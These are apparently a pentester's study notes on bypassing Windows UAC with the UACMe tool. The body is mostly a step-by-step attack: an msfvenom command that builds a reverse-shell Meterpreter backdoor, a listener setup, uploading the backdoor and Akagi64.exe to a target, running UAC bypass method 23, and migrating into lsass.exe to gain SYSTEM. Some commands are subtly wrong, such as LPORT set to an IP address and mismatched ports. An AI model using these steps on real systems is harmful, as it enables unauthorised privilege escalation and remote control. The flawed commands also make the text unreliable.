## Bypassing UAC with UACMe

> \-UAC (User Account Control) ensures that changes made to the OS are approved by the administrator or a user account that is part of an administrator group.
> 
> \-Attacks can bypass UAC in order to execute malicious executables with elevated privileges.
> 
> \-We need to have access to a user account that is a part of the local administrator group.
> 
> \-In order to bypass UAC, we will need to have access to a user account that is a part of local administrator group.
> 
> \-UAC has various integrity levels ranging from low to high. If the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user confirmation.

## [UACMe](https://github.com/hfiref0x/UACME)

> Privilege escalation tool which has more than 60 exploits.
> 
> It allows attackers to execute malicious payloads on a Windows target with elevated privileges by abusing the inbuilt Windows AutoEelevate tool.

Identify a vulnerability running on the target

After getting a meterpreter session, do some enumeration

```plaintext
sysinfo
pgrep explorer
migrate “number of explorer”
sysinfo
getuid
getprivs
```

migrate to a  cmd shell session and do some enumeration

```plaintext
shell
net user
net localgroup administrators
```

Using UACMe/Example

generate a meterpreter payload with msfvenom

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=MYIP LPORT=10.10.10.10 -F exe > backdoor.exe
```

set up the listener with msfconsole to receive the connection once the payload is executed on the target

```plaintext
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST MYIP
set LPORT 1234
run
```

from mterpreter session, upload the exploit, navigate to or create the Temp directory

```plaintext
cd C:\\
mkdir Temp
cd Temp
upload backdoor.exe
upload /root/Desktop/tools/UACME/Akagi64.exe
```

ope a shell session

```plaintext
shell
dir
```

Now, to execute backdoor.exe with administrator privileges, we are blocked by UAC. To bypass that, we will use key23 from the shell session (or something else, depending on the target)

```plaintext
.\Akagi64.exe 23 C:\Temp\backdoor.exe
```

This will bypass UAC and we will have a new elevated meterpreter session on the listener.

```plaintext
sysinfo
getuid
getprivs
<list out processes>
ps
<migrate to an other service that has NT AUTHORITY\SYSTEM like lsass.exe>
migrate <lsass number>
getuid
```
